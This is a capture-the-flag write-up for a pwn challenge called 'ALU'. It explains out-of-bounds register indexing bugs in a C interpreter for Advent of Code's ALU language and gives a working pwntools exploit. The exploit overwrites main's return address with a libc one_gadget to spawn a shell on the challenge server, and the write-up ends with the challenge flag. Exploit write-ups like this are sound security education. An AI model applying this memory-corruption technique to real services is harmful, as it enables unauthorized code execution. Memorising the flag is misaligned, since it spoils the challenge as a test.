# 🩸 ALU
Have you tried the AoC 22 24 VM?

MD5 (alu.zip) = 8b04d09040e879f7558d59b14e9ef191

Author: enigmatrix

`nc challs.nusgreyhats.org 13500`

```sh
$ tree alu
alu
├── alu
├── alu.c
├── ld-2.31.so
└── libc-2.31.so
$ checksec alu/alu
[*] 'alu/alu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# Finding the bug
`alu` takes in a valid program from stdin and executes it. The language spec follows what's on the [AoC page](https://adventofcode.com/2021/day/24), and like any other AoC program, `alu.c` was written with 0 appreciation for the possibility of ill-formatted inputs.

The important bugs are over in `main()`:
```c
    int a = *(u_char*)(line + 4) - 'a'; // line[4] can be ANYTHING, important for later
    int b = bv.is_reg ? regs[bv.v] : bv.v; // trivial oob index
```
`int b` can become an OOB read because `bv.is_reg` can be true even when `bv.v >= 26`:
```c
    if ((('0' <= buf[0]) && (buf[0] <= '9')) || buf[0] == '-') {
        /* ... */
    } else { // buf[0] can be > 'z' !
        b.is_reg = true;
        b.v = *(u_char*)buf - 'a'; // easy oob index
    }
```
And the uncontrolled value of `int a` can be used for an OOB write:
```c
    if (strncmp(line, "inp", 3) == 0) {
        //...
    } else if (strncmp(line, "add", 3) == 0) {
        regs[a] += b;
    } else if { /* ... */ }
```

So, we have a read-anywhere followed by a write-anywhere. *Obviously*, we can use this to spawn a shell in a **single line of input**:
```python
>>> from pwn import *
>>> r = remote('challs.nusgreyhats.org', 13500)
[+] Opening connection to challs.nusgreyhats.org on port 13500: Done
>>> r.sendline(b'add \x9f 785022\n') # :thinking:
>>> r.interactive() # solved lol
```

## Wait, what??
So, let me try to explain.

First off, I didn't _actually_ only send one line. I sent one `add` line, and another empty line to return from the main function.

Why return to `main`? Because the `add` opcode was used to modify the return pointer of `main`, which experienced pwners will know as the special pseudosymbol `__libc_start_main_ret`. In this `add` command:
```c
    regs[a] += b;
```
`regs[a]` points to the return address of `main()`, and `b` is equivalent to `<some win function> - libc['__libc_start_main_ret']`. So, the return address of `main` will be changed to `<some win function>` after the first line of input. But, you ask:

> Where do I get `<some win function>`? Even libc's `system()` requires at least 1 argument.

This is where you must learn about the marvelous [one_gadget](https://github.com/david942j/one_gadget) project. There really exists a specific code address in `libc-2.31.so` that will simply give you a free shell.

```python
from pwnscripts import *
context.binary = 'alu'
context.libc = './libc-2.31.so'

r = remote('challs.nusgreyhats.org', 13500)
main_ret_index = 0xf8//4 # from gdb

r.sendlineafter(b'> ', b'add %s %d\n' % (
    p8(ord('a')+main_ret_index), # this is `a`
    context.libc.select_gadget(1)
   -context.libc.symbols['__libc_start_main_ret'] # this is `b`
))

r.interactive()
```
Unfortunately, I was unable to obtain the first blood for this challenge, as I signed up late for the CTF. But at least it looks nice, y'know?

## Flag
`grey{b6bee86b92aa5d4cd85bda82bd0e0317}`
